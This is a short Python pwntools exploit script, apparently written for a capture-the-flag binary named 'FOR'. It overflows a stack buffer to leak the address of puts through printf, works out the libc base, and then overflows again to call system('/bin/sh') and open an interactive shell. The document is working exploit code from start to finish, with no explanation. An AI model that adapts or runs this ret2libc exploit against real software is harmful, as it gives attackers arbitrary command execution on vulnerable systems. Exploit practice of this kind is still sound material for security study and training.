from pwn import *

io = process('./FOR', env={'LD_PRELOAD' : './libc.so.6'})
e = ELF('./FOR')
l = ELF('./libc.so.6')

context.log_level='debug'

# first attempt

payload = 'A'*0x6c
payload += 'B'*4
payload += p32(e.sym['printf'])
payload += p32(e.sym['main'])
payload += p32(e.got['puts'])



print io.recv()
io.sendline(payload)

puts_got = u32(io.recv(4))
l.address = puts_got-l.sym['puts']

log.info('libc base addr : 0x%x' % l.address)

io.recv()

payload ='A'*0x6c
payload += 'BBBB'
payload += p32(l.sym['system'])
payload += p32(l.sym['exit'])
payload += p32(l.search('/bin/sh\x00').next())

io.sendline(payload)

io.interactive()
